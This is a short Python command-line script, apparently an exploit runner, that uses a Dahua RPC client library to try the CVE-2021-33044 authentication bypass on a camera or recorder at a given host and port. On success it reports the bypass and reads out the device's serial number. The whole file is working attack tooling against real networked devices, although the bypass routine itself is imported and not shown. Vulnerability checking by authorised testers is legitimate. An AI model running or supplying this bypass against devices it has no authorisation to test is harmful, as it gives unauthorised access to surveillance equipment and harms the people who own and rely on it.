import argparse
from dahua.client import DahuaRpc
from dahua.exceptions import DahuaInvalidCredentials
from dahua.utils.cve import bypass_cve2021_33044


def main(host: str, port: int):
    dahua = DahuaRpc(host=host, port=port)

    try:
        bypass_cve2021_33044(dahua)  # login bypass
    except DahuaInvalidCredentials as e:
        print(f"Device is not vulnerable to CVE-2021-33044")
        exit(1)

    print("Authentication Bypassed (CVE-2021-33044)!")
    print("Serial Number: " + dahua.magic_box.get_serial_number())

    dahua.logout()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dahua Authentication Bypass")
    parser.add_argument(
        "-host", "--host", type=str, required=True, help="Host address of the device"
    )
    parser.add_argument(
        "-port", "--port", type=int, default=80, help="Port number of the device"
    )
    args = parser.parse_args()

    main(args.host, args.port)
